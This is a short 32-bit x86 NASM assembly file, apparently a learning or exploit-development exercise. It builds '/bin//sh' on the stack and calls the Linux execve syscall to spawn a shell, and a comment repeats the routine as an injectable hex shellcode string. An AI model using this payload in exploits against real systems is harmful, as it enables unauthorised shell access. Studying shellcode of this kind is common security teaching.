bits 32

section .text

global main 

main:
    ;\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80

    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov ecx, eax
    mov edx, eax
    mov al,0xb
    int 0x80
